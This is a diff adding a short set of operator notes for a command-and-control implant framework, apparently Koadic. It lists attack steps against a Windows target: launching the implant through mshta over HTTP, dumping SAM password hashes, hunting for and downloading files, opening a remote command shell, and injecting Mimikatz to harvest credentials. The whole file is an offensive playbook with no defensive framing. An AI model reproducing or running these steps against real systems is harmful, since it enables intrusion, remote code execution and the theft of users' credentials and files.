@@ -1,0 +1,26 @@
+# Main implant is called
+sta/js/mshta
+
+# You connect by running mshta http:// on the target machine
+
+
+// Get Creds
+    use implant/gather/hashdump_sam
+    # This will dump all the creds for each user
+
+// Find files
+    use implant/gather/loot_finder
+    # Find files for the target
+
+// Get files 
+    set cmd certutil -hashfile C:\Windows\SysWOW64\WsmPty.xsl
+    use implant/util/download_file
+    set rfile C:\Windows\SysWOW64\WsmPty.xsl
+
+// Get a temrinal
+    cmdshell #
+
+// Mimikatz 
+    use implant/inject/mimikatz_dynwrapx
+    run
+    creds # list creds collected
